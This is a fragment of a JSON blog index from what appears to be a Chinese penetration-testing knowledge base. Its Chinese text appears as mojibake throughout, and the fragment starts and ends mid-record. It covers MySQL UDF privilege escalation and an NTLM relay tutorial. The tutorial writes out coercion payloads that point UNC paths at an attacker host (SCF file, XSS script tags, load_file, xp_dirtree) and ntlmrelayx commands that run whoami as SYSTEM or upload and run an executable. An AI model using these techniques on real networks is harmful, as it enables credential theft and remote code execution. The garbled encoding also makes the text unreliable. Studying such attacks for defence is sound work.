ä¸‰ã€é’ˆå¯¹MySQLææƒçš„é˜²å¾¡æ‰‹æ®µ ä»ä¸Šé¢æåˆ°çš„ææƒè¿‡ç¨‹å¯ä»¥çŸ¥é“ï¼Œè¿™äº›æƒé™æå‡åŸºæœ¬éƒ½æ˜¯mysqlçš„é…ç½®ä¸å½“å¯¼è‡´çš„ï¼Œå› æ­¤ï¼Œå¯ä»¥æœ‰å¦‚ä¸‹é˜²å¾¡æªæ–½ï¼š\né™ä½æ•°æ®åº“æœåŠ¡å¯åŠ¨ç”¨æˆ·çš„æƒé™ å¦‚æœéå¿…è¦ï¼Œå¯ä»¥åˆ é™¤æ’ä»¶ç›®å½•æˆ–é™åˆ¶æ’ä»¶ç›®å½•çš„æƒé™ æ­£ç¡®é…ç½®secure_file_privå˜é‡ ",
        "summary": "MySQLææƒ mysqlçš„æƒé™æå‡é€šå¸¸å¯ä»¥ä¸¤ç§ï¼š\nUDFææƒï¼ˆå¸¸ç”¨ï¼‰ å†™æ–‡ä»¶ææƒ å¯åŠ¨é¡¹ææƒ mofææƒ ä¸€ã€UDFææƒ UDF å…¨ç§°ä¸ºuser defined functionï¼Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°\nç”¨æˆ·å¯ä»¥æ·»åŠ è‡ªå®šä¹‰çš„æ–°å‡½æ•°åˆ°Mysqlä¸­ï¼Œä»¥è¾¾åˆ°åŠŸèƒ½çš„æ‰©å……ï¼Œè°ƒç”¨æ–¹å¼ä¸ä¸€èˆ¬ç³»ç»Ÿè‡ªå¸¦çš„å‡½æ•°ç›¸åŒï¼Œä¾‹å¦‚ contact()ï¼Œuser()ï¼Œversion()ç­‰å‡½æ•°\nUDFææƒçš„ä½œç”¨ æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ‹¿ä¸‹ä¸€å°ä½æƒé™çš„ä¸»æœºshellï¼ˆå°¤å…¶æ˜¯windowsï¼‰æ—¶ï¼Œæœ‰äº›æ“ä½œæ— æ³•è¿›è¡Œï¼Œè€Œæ­¤æ—¶æœ¬åœ°æ°å¥½å­˜åœ¨mysqlæ•°æ®åº“ï¼Œä¸”mysqlæ˜¯rootæƒé™ (windowsä¸­mysqlä¸€èˆ¬éƒ½æ˜¯ç®¡ç†å‘˜æƒé™)ï¼Œå°±å¯ä»¥é€šè¿‡æ–°å»ºç®¡ç†å‘˜ç”¨æˆ·ç­‰æ“ä½œå®ç°ææƒå³udfææƒï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºé€šè¿‡mysqlè·å¾—ç®¡ç†å‘˜æƒé™\nåŠ¨æ€é“¾æ¥åº“ åŠ¨æ€é“¾æ¥åº“ï¼šæ˜¯æŠŠç¨‹åºä»£ç ä¸­ä¼šä½¿ç”¨çš„å‡½æ•°ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¿å­˜åœ¨.dllæ–‡ä»¶ä¸­ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œä¸ä¼šæŠŠå‡½æ•°çš„æœºå™¨ç å¤åˆ¶ä¸€ä»½åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ç¼–è¯‘å™¨åªä¼šåœ¨.exeçš„æ‰§è¡Œæ–‡ä»¶é‡Œï¼Œè¯´æ˜æ‰€è¦è°ƒç”¨çš„å‡½æ•°æ”¾åœ¨å“ªä¸€ä¸ª*.dllæ–‡ä»¶ã€‚ç¨‹åºæ‰§è¡Œä½¿ç”¨åˆ°è¿™äº›å‡½æ•°æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠdllæ–‡ä»¶ä¸­çš„å‡½æ•°æ‹¿å‡ºæ¥ç»™æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨\næ³¨ï¼šåœ¨linuxä¸­å¯¹åº”ä¸ºsoæ–‡ä»¶\nåˆ©ç”¨æ¡ä»¶ä»¥åŠæ•°æ®åº“ç‰ˆæœ¬é—®é¢˜ è·å¾—ä¸€ä¸ªmysqlæ•°æ®åº“è´¦å·ï¼ˆæœ€å¥½æ˜¯rootï¼‰ï¼Œæ‹¥æœ‰insertã€deleteæƒé™ï¼Œæ‹¥æœ‰å°†xxx.dllå†™å…¥ç›¸å¯¹åº”ç›®å½•çš„æƒé™\næŸ¥çœ‹ç‰ˆæœ¬ï¼š\nselect version(); æŸ¥çœ‹secure-file-privæ˜¯å¦æœ‰ç›®å½•é™åˆ¶ï¼Œæ‰§è¡Œï¼š\nshow global variables like \u0026#34;secure%\u0026#34;; å½“secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ— æ³•è¿›è¡Œææƒ å½“secure_file_priv çš„å€¼ä¸º c:/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨cç›˜ç›®å½•ä¸‹ï¼Œæ— æ³•è¿›è¡Œææƒ å½“ secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œå¯ä»¥ææƒ æŸ¥çœ‹pluginç›®å½•æ˜¯å¦å­˜åœ¨ï¼š\nselect @@plugin_dir; #æˆ– show variables like \u0026#39;plugin%\u0026#39;; udfåˆ©ç”¨çš„å…¶ä¸­ä¸€æ­¥ï¼Œæ˜¯è¦å°†æˆ‘ä»¬çš„xxx.dllæ–‡ä»¶ä¸Šä¼ åˆ°mysqlæ£€ç´¢ç›®å½•ä¸­ï¼Œmysqlå„ç‰ˆæœ¬çš„æ£€ç´¢ç›®å½•æœ‰æ‰€ä¸åŒï¼š\nç‰ˆæœ¬ è·¯å¾„ MySQL \u0026lt; 5.0 å¯¼å‡ºè·¯å¾„éšæ„ 5.0 \u0026lt;= MySQL \u0026lt; 5.1 éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šC:\\windows\\system32\\ï¼‰ 5.1 \u0026lt; MySQL å¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginç›®å½•ä¸‹ï¼ˆé«˜ç‰ˆæœ¬mysqlé»˜è®¤ä¸å­˜åœ¨lib\\pluginç›®å½•ï¼Œéœ€è¦è‡ªå·±åˆ›å»ºï¼‰ ç‰ˆæœ¬å¤§äº5.1çš„æ—¶å€™ï¼Œlib\\pluginæ–‡ä»¶å¤¹çš„åˆ›å»ºæ–¹æ³•ï¼š\n"
    }
,
    {
        "title": "NTLM Relayä¸“é¢˜",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/ntlm-relay%E4%B8%93%E9%A2%98/",
        "content": "NTLM Relayä¸“é¢˜ NTLMåè®®å’ŒNTLM Relayçš„ç›¸å…³æ¦‚å¿µå·²ç»åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä»‹ç»è¿‡äº†ï¼Œ è¿™é‡Œç›´æ¥ä»ç›¸å…³æ”»å‡»æ–¹æ³•ä»¥åŠæ­¥éª¤å¼€å§‹\nå‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚ æ¶ˆæ¯ä¼ è¾“ä¾èµ–ä½¿ç”¨NTLMè®¤è¯çš„ä¸Šå±‚åè®®ï¼Œæ¯”å¦‚SMPã€LDAPã€HTTPã€MSSQLï¼Œåªè¦æ˜¯ä½¿ç”¨è¿™äº›ä¸Šå±‚åè®®çš„åº”ç”¨ç¨‹åºéƒ½å¯ä»¥å‘èµ·NTLMè¯·æ±‚ï¼Œè€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨responderæ‹¦æˆªNTLMè®¤è¯è¯·æ±‚è·å–net-HTLM hashï¼š\nresponderï¼šReleases Â· SpiderLabs/Responder\nå¸¸ç”¨æ–¹æ³• é€šå¸¸é€šè¿‡è®¾ç½®æŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œä½¿ç›®æ ‡ä¸»æœºè‡ªåŠ¨å‘æ¶æ„æœåŠ¡å™¨å‘èµ·HTLMè®¤è¯ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nç³»ç»Ÿå‘½ä»¤ ä½¿ç”¨èƒ½ä¼ å…¥UNCè·¯å¾„çš„å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š\ndir \\\\192.168.111.130\\share net use \\\\192.168.111.130\\share è¿™æ ·çš„å‘½ä»¤è¿˜æœ‰å¾ˆå¤šï¼Œå½“æˆ‘ä»¬å‘èµ·è®¤è¯responderå³å¯æˆåŠŸæˆªå–net-NTLM hash v2ï¼š\ndesktop.ini windowsç³»ç»Ÿä¸‹æœ‰ä¸ªéšè—æ–‡ä»¶desktop.iniï¼Œç”¨äºæŒ‡å®šå’Œå­˜å‚¨æ–‡ä»¶å¤¹å›¾æ ‡ä¹‹ç±»çš„ä¸ªæ€§åŒ–è®¾ç½®ï¼Œè¿™é‡Œé¢çš„iconresourceæ˜¯æ–‡ä»¶å¤¹çš„å›¾æ ‡è·¯å¾„ï¼Œå¯ä»¥æ”¹ä¸ºæŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCï¼Œé‚£ä¹ˆå½“ä¸»æœºè¯·æ±‚å›¾æ ‡èµ„æºæ—¶ï¼Œå³å¯æˆªè·htlm hashï¼š\nä¾‹å¦‚æˆ‘å°†musicæ–‡ä»¶å¤¹çš„desktop.iniæ›´æ”¹ï¼š\nåªè¦æ˜¾ç¤ºæ—¶è¯·æ±‚å›¾æ ‡å³å¯æˆªè·htlm hashï¼š\nSCFæ–‡ä»¶ è¿™æ˜¯æ–‡ä»¶èµ„æºç®¡ç†å™¨å‘½ä»¤æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­çš„IconFileå±æ€§å¯ä»¥æŒ‡å®šUNCè·¯å¾„ï¼Œæ–‡ä»¶èµ„æºç®¡ç†å™¨ä¼šåŠ è½½è¿™ä¸ªå±æ€§æŒ‡å®šçš„æ–‡ä»¶å›¾æ ‡ï¼Œé‚£ä¹ˆå’Œä¸Šé¢åŒç†ï¼š\nåœ¨ä»»æ„æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºtest.scfæ–‡ä»¶ï¼š\n[shell] Command=2 IconFile=\\\\192.168.111.130\\share\\test.ico [Taskbar] Command=ToggleDesktop ç”¨æˆ·è®¿é—®è¯¥æ–‡ä»¶å¤¹å°±ä¼šè‡ªåŠ¨è¯·æ±‚æœåŠ¡å™¨ï¼Œå¯¼è‡´htlm hashè¢«æˆªè·ï¼š\næ–‡æ¡£ç±»æ–‡ä»¶ PDFè§„èŒƒå…è®¸GoTobeå’ŒGoToRæ¡ç›®åŠ è½½è¿œç¨‹å†…å®¹ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨PDFä¸­æ’å…¥UNCè·¯å¾„ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨adobe readeræ‰“å¼€pdfï¼Œåˆ™ä¼šå‘èµ·HTLMè¯·æ±‚\nå¯ä»¥ä½¿ç”¨githubä¸Šçš„badpdfè¿›è¡Œç”Ÿæˆæ¶æ„çš„PDFï¼Œè¿™é‡Œä¸åšèµ˜è¿°\nè¯¥æ–¹æ³•å±€é™æ€§å¾ˆé«˜ï¼Œå¿…é¡»ä½¿ç”¨adobe readeræ‰ä¼šè§¦å‘NTLMè®¤è¯\nå½“ç„¶officeä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹\næ‰“å°æœº Windowsçš„MS-RPRNåè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å¯ç”¨çš„ã€‚åè®®å®šä¹‰çš„RpcRemoteFindFirstPrinterChangeNotificationEx()è°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ã€‚\nä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸæˆå‘˜éƒ½å¯ä»¥è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨çš„æ‰“å°æœåŠ¡ï¼ˆspoolsv.exeï¼‰ï¼Œå¹¶è¯·æ±‚å¯¹ä¸€ä¸ªæ–°çš„æ‰“å°ä½œä¸šè¿›è¡Œæ›´æ–°ï¼Œä»¤å…¶å°†è¯¥é€šçŸ¥å‘é€ç»™æŒ‡å®šç›®æ ‡ã€‚ä¹‹åå®ƒä¼šå°†ç«‹å³æµ‹è¯•è¯¥è¿æ¥ï¼Œå³å‘æŒ‡å®šç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆæ”»å‡»è€…å¯ä»¥é€‰æ‹©é€šè¿‡Kerberosæˆ–NTLMè¿›è¡ŒéªŒè¯ï¼‰ã€‚\né€šè¿‡è„šæœ¬PetitPotemå¯ä»¥è®©ç›®æ ‡æœºå™¨å¼ºåˆ¶å›è¿\nä½†æ˜¯ç”±äºæœºå™¨ç‰ˆæœ¬é—®é¢˜ï¼Œä½¿ç”¨printerbugå¾ˆå¯èƒ½å‡ºé—®é¢˜(å‡½æ•°è°ƒç”¨é—®é¢˜)ï¼Œå¯ä»¥ä½¿ç”¨Coercerè¿›è¡Œå‡½æ•°fuzzæµ‹è¯•ï¼Œæ¯”è¾ƒå¥½ç”¨\nwebå±‚é¢çš„åˆ©ç”¨ XSS ä½¿ç”¨srcæ ‡ç­¾è¯·æ±‚æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯\nå¦‚æœç”¨UNCè·¯å¾„ï¼š\n\u0026lt;script src=\u0026#34;\\\\192.168.111.130\\xss\u0026#34;\u0026gt; è¿™ç§æƒ…å†µé€‚ç”¨äºIEå’Œedgeï¼Œèƒ½å¤Ÿç›´æ¥æˆªè·ntlm hash\nå¦‚æœé€šè¿‡httpï¼š\n\u0026lt;script src=\u0026#34;//192.168.30.130/xss\u0026#34;\u0026gt; è¿™æ ·çš„æ ‡ç­¾è®¿é—®é¡µé¢ä¼šå¼¹å‡ºè®¤è¯æ¡†ï¼Œéœ€è¦ç”¨æˆ·ç™»å½•åæ‰èƒ½æˆªè·htlm hash\næ–‡ä»¶åŒ…å« åŒç†äº†ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°æ”¯æŒè§£æUNCè·¯å¾„\nå½“ç„¶ï¼ŒXXEã€SSRFéƒ½å¯ä»¥å°è¯•è¿™æ ·åˆ©ç”¨\nsqlæ³¨å…¥ windowsä¸Šå®‰è£…çš„mysqlä¸­1ï¼Œload_fileã€into dumpfileç­‰å¸¸è§å‡½æ•°åŒæ ·æ”¯æŒUNCè·¯å¾„ï¼š\nselect load_file(\u0026#39;\\\\\\\\192.168.111.130\\\\file\u0026#39;) # å”¯ä¸€æœ‰å˜åŒ–çš„æ˜¯è¿™é‡Œçš„\\è¦ç”¨\\\\æ¥è½¬ä¹‰ä¸€ä¸‹ mssqlå¯ä»¥è°ƒç”¨xp_fileexistã€xp_create_subdirã€xp_dirtreeç­‰å‡½æ•°è¿›è¡Œåˆ©ç”¨ï¼š\nexec master.sys.xp_dirtree \u0026#39;\\\\192.168.111.130\\share\u0026#39;; NBNS\u0026amp;LLMNRæ¬ºéª—åˆ©ç”¨ windows è§£æåŸŸåçš„é¡ºåºæ˜¯\nHosts DNS (cache / server) LLMNR NBNS å¦‚æœHostsæ–‡ä»¶é‡Œé¢ä¸å­˜åœ¨ï¼Œå°±ä¼šä½¿ç”¨DNSè§£æã€‚å¦‚æœDNSè§£æå¤±è´¥ï¼Œå°±ä¼šä½¿ç”¨LLMNRè§£æï¼Œå¦‚æœLLMNRè§£æå¤±è´¥ï¼Œå°±ä¼šä½¿ç”¨NBNSè§£æ\nLLMNR æ˜¯ä¸€ç§åŸºäºåè®®åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰æ•°æ®åŒ…çš„æ ¼å¼ï¼Œä½¿å¾—ä¸¤è€…çš„IPv4å’ŒIPv6çš„ä¸»æœºè¿›è¡Œåç§°è§£æä¸ºåŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºï¼Œå› æ­¤ä¹Ÿç§°ä½œå¤šæ’­ DNS\nLLMNR è¿›è¡Œåç§°è§£æçš„è¿‡ç¨‹ä¸ºï¼š\næ£€æŸ¥æœ¬åœ° NetBIOS ç¼“å­˜ å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰åˆ™ä¼šåƒå½“å‰å­ç½‘åŸŸå‘é€å¹¿æ’­ å½“å‰å­ç½‘åŸŸçš„å…¶ä»–ä¸»æœºæ”¶åˆ°å¹¶æ£€æŸ¥å¹¿æ’­åŒ…ï¼Œå¦‚æœæ²¡æœ‰ä¸»æœºå“åº”åˆ™è¯·æ±‚å¤±è´¥ æœ‰æ²¡æœ‰æ„Ÿè§‰å’ŒARPç±»ä¼¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨ä¹Ÿå’ŒARPæ¬ºéª—ç±»ä¼¼ï¼Œè€Œresponderåªè¦æ­£åœ¨ç›‘å¬å°±å¯ä»¥è‡ªåŠ¨å“åº”ä¸Šé¢æåˆ°çš„å¹¿æ’­ï¼š\nè¯·æ±‚ä¸å­˜åœ¨çš„åŸŸåï¼š\nè‡ªåŠ¨æˆªè·ï¼š\netBIOS åè®®è¿›è¡Œåç§°è§£æçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š\næ£€æŸ¥æœ¬åœ° NetBIOS ç¼“å­˜ å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰è¯·æ±‚çš„åç§°ä¸”å·²é…ç½®äº† WINS æœåŠ¡å™¨ï¼Œæ¥ä¸‹æ¥åˆ™ä¼šå‘ WINS æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ å¦‚æœæ²¡æœ‰é…ç½® WINS æœåŠ¡å™¨æˆ– WINS æœåŠ¡å™¨æ— å“åº”åˆ™ä¼šå‘å½“å‰å­ç½‘åŸŸå‘é€å¹¿æ’­ å¦‚æœå‘é€å¹¿æ’­åæ— ä»»ä½•ä¸»æœºå“åº”åˆ™ä¼šè¯»å–æœ¬åœ°çš„ lmhosts æ–‡ä»¶ lmhosts æ–‡ä»¶ä½äºC:\\Windows\\System32\\drivers\\etc\\ç›®å½•ä¸­ã€‚\nNetBIOS åè®®è¿›è¡Œåç§°è§£ææ˜¯å‘é€çš„ UDP å¹¿æ’­åŒ…ã€‚å› æ­¤åœ¨æ²¡æœ‰é…ç½® WINS æœåŠ¡å™¨çš„æƒ…å†µåº•ä¸‹ï¼ŒLLMNRåè®®å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼Œåœ¨NBNSåè®®é‡Œé¢åŒæ—¶å­˜åœ¨\næ–¹æ³•å’Œä¸Šé¢ä¸€æ ·ï¼Œä¸åšèµ˜è¿°\nrelay to SMB relayåˆ°SMBå¯ä»¥ç›´æ¥è·å–ç›®æ ‡æœåŠ¡å™¨æœ¬åœ°æ§åˆ¶æƒï¼Œè¿™æ˜¯NTLM relay æœ€ç»å…¸çš„åˆ©ç”¨æ–¹å¼\nSMBç­¾å åˆ†ä¸ºæœåŠ¡ç«¯ç­¾åå’Œå®¢æˆ·ç«¯ç­¾åï¼Œå¦‚æœå¯ç”¨äº†æœåŠ¡ç«¯ç­¾åï¼Œåˆ™å®¢æˆ·ç«¯æ— æ³•ä¸è¯¥æœåŠ¡å™¨å»ºç«‹ä¼šè¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå·¥ä½œç«™ã€æœåŠ¡å™¨ã€åŸŸæ§ä¸Šä¼šå¯ç”¨æœåŠ¡ç«¯ç­¾åï¼›åŒç†ï¼Œå¦‚æœå¯ç”¨äº†å®¢æˆ·ç«¯SMBç­¾åï¼Œè¿™ä¸ªå®¢æˆ·ç«¯å°±æ— æ³•ä¸æœªå¯ç”¨æ•°æ®åŒ…ç­¾åçš„æœåŠ¡å™¨å»ºç«‹ä¼šè¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä»…åœ¨åŸŸæ§ä¸Šå¯ç”¨æœåŠ¡ç«¯SMBç­¾å\nresponderæœ‰å†…ç½®å·¥å…·ç”¨äºæ‰«æå†…ç½‘ä¸»æœºSMBç­¾åæƒ…å†µï¼š\npython RunFinger.py -i 192.168.111.0/24 åŸŸç¯å¢ƒä¸‹çš„åˆ©ç”¨ ADåŸŸä¸­ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·çš„hashéƒ½å­˜æ”¾äºæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†åŸŸç”¨æˆ·çš„NTLMè¯·æ±‚relayåˆ°å…¶ä»–æœºå™¨ï¼ˆå‰ææ˜¯åŸŸç”¨æˆ·ç™»å½•ä¸å—é™ä¸”æœºå™¨æ²¡æœ‰å¼€å¯ç­¾åï¼‰\nå¯ä»¥ä½¿ç”¨impacketä¸­çš„ntlmrelayx.pyè¿›è¡Œrelayï¼š\nå¯åŠ¨ç›‘å¬ï¼š\npython ntlmrelayx.py -t smb://192.168.111.128 -c whoami -smb2support ä½¿ç”¨ä¸Šé¢æåˆ°è¿‡çš„æ–¹æ³•åœ¨è¯±å¯¼clientï¼ˆæˆ‘è¿™é‡Œä½¿ç”¨DCï¼‰è§¦å‘ntlmè®¤è¯ï¼š\nè„šæœ¬ä¼šå°†è·å¾—çš„htlm hash relayåˆ°å‚æ•°æŒ‡å®šçš„serverï¼ˆæˆ‘è¿™é‡Œä½¿ç”¨åŸŸæˆå‘˜ä¸»æœºï¼‰ï¼š\nå¯ä»¥çœ‹è§ä¸ä»…æ‰§è¡Œwhoamiï¼Œè¿˜æ˜¯systemæƒé™\nåŒç†ï¼Œè¿™ä¸ªè„šæœ¬è¿˜èƒ½ä¸Šä¼ æ–‡ä»¶ï¼š\npython ntlmrelayx.py -t smb://192.168.111.128 -e /root/artifact.exe -smb2support å·¥ä½œç»„çš„åˆ©ç”¨ åœ¨å·¥ä½œç»„ä¸­ï¼Œç”¨æˆ·çš„hashä¿å­˜åœ¨å„è‡ªä¸»æœºçš„SAMæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¾ˆéš¾å°†ä¸€å°ä¸»æœºçš„NTLMè¯·æ±‚relayåˆ°å…¶ä»–ä¸»æœºï¼Œæ‰€ä»¥é€šå¸¸é‡‡å–NTLM reflectï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºåå°„ï¼Œåœ¨ä¹‹å‰çš„æƒé™æå‡éƒ¨åˆ†è®¿é—®ä»¤ç‰Œæ“çºµms08-068ä»¥åŠå…¶è¡¥ä¸ç‰ˆæœ¬æ¼æ´ghost potatoæ–‡ç« ä¸­æåˆ°è¿‡ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nrelay to exchange å¯ä»¥ä½¿ç”¨ntlm relayæ¥ç®¡ç›®æ ‡ä¸»æœºç”¨æˆ·çš„exchangeé‚®ç®±ï¼Œä½†å›½å†…ä½¿ç”¨exchangeé‚®ç®±æœåŠ¡çš„å•ä½éå¸¸ç½•è§ï¼Œå¹¶ä¸”æœ‰æ›´è¿‡æ›´å¥½çš„åˆ©ç”¨æ–¹å¼ï¼Œè¿™é‡Œå°±åªç®€å•æåŠä¸ç»†è¯´äº†\nrelay to ldap å¯ä»¥ä½¿ç”¨ntlm relay to ldapæ¥æ¥ç®¡åŸŸä¸­çš„æ´»åŠ¨ç›®å½•\næœ‰ä¸‰ç§é€šç”¨æ€§æ¯”è¾ƒå¼ºçš„åˆ©ç”¨æ€è·¯ï¼Œè¿™ä¸‰ç§åœ¨impacketé‡Œé¢çš„ntlmrelayxéƒ½æœ‰å®ç°\né«˜æƒé™ç”¨æˆ· å¦‚æœNTLMå‘èµ·ç”¨æˆ·åœ¨ä»¥ä¸‹ç”¨æˆ·ç»„\nEnterprise admins Domain admins Built-in Administrators Backup operators Account operators é‚£ä¹ˆå°±å¯ä»¥å°†ä»»æ„ç”¨æˆ·æ‹‰è¿›è¯¥ç»„ï¼Œä»è€Œä½¿è¯¥ç”¨æˆ·ç§°ä¸ºé«˜æƒé™ç”¨æˆ·ï¼Œæ¯”å¦‚åŸŸç®¡\nWrite Acl æƒé™ å¦‚æœå‘èµ·è€…å¯¹DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)å’ŒDS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)æœ‰write-acl æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨è¯¥aclé‡Œé¢æ·»åŠ ä»»æ„ç”¨æˆ·ï¼Œä»è€Œä½¿å¾—è¯¥ç”¨æˆ·å¯ä»¥å…·å¤‡dcsyncçš„æƒé™\nè¿™ä¸ªæ¡ˆä¾‹çš„å…¸å‹ä¾‹å­å°±æ˜¯Exchange Windows Permissionsç»„ã€‚\næ™®é€šç”¨æˆ·æƒé™RBCD å¯¹äºä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ·ï¼Œå¯èƒ½ä¼šéœ€è¦ç”¨åˆ°åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œä½†å‰ææ˜¯è¿™ä¸ªæ™®é€šåŸŸç”¨æˆ·èƒ½å¤Ÿä¿®æ”¹ç›®æ ‡ä¸»æœºçš„å±æ€§ï¼Œèƒ½å¤Ÿåˆ›å»ºæœºå™¨è´¦æˆ·ã€‚\næ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶å°±èƒ½å¤Ÿä½¿ç”¨èµ„æºçº¦æŸå§”æ´¾äº†ã€‚è¯¦ç»†å¯ä»¥çœ‹å§”æ´¾æ”»å‡»çš„åœ°æ–¹\n",
        "summary": "NTLM Relayä¸“é¢˜ NTLMåè®®å’ŒNTLM Relayçš„ç›¸å…³æ¦‚å¿µå·²ç»åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä»‹ç»è¿‡äº†ï¼Œ è¿™é‡Œç›´æ¥ä»ç›¸å…³æ”»å‡»æ–¹æ³•ä»¥åŠæ­¥éª¤å¼€å§‹\nå‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚ æ¶ˆæ¯ä¼ è¾“ä¾èµ–ä½¿ç”¨NTLMè®¤è¯çš„ä¸Šå±‚åè®®ï¼Œæ¯”å¦‚SMPã€LDAPã€HTTPã€MSSQLï¼Œåªè¦æ˜¯ä½¿ç”¨è¿™äº›ä¸Šå±‚åè®®çš„åº”ç”¨ç¨‹åºéƒ½å¯ä»¥å‘èµ·NTLMè¯·æ±‚ï¼Œè€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨responderæ‹¦æˆªNTLMè®¤è¯è¯·æ±‚è·å–net-HTLM hashï¼š\nresponderï¼šReleases Â· SpiderLabs/Responder\nå¸¸ç”¨æ–¹æ³• é€šå¸¸é€šè¿‡è®¾ç½®æŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œä½¿ç›®æ ‡ä¸»æœºè‡ªåŠ¨å‘æ¶æ„æœåŠ¡å™¨å‘èµ·HTLMè®¤è¯ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nç³»ç»Ÿå‘½ä»¤ ä½¿ç”¨èƒ½ä¼ å…¥UNCè·¯å¾„çš„å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š\ndir \\\\192.168.111.130\\share net use \\\\192.168.111.130\\share è¿™æ ·çš„å‘½ä»¤è¿˜æœ‰å¾ˆå¤šï¼Œå½“æˆ‘ä»¬å‘èµ·è®¤è¯responderå³å¯æˆåŠŸæˆªå–net-NTLM hash v2ï¼š\ndesktop.ini windowsç³»ç»Ÿä¸‹æœ‰ä¸ªéšè—æ–‡ä»¶desktop.iniï¼Œç”¨äºæŒ‡å®šå’Œå­˜å‚¨æ–‡ä»¶å¤¹å›¾æ ‡ä¹‹ç±»çš„ä¸ªæ€§åŒ–è®¾ç½®ï¼Œè¿™é‡Œé¢çš„iconresourceæ˜¯æ–‡ä»¶å¤¹çš„å›¾æ ‡è·¯å¾„ï¼Œå¯ä»¥æ”¹ä¸ºæŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCï¼Œé‚£ä¹ˆå½“ä¸»æœºè¯·æ±‚å›¾æ ‡èµ„æºæ—¶ï¼Œå³å¯æˆªè·htlm hashï¼š\nä¾‹å¦‚æˆ‘å°†musicæ–‡ä»¶å¤¹çš„desktop.iniæ›´æ”¹ï¼š\nåªè¦æ˜¾ç¤ºæ—¶è¯·æ±‚å›¾æ ‡å³å¯æˆªè·htlm hashï¼š\nSCFæ–‡ä»¶ 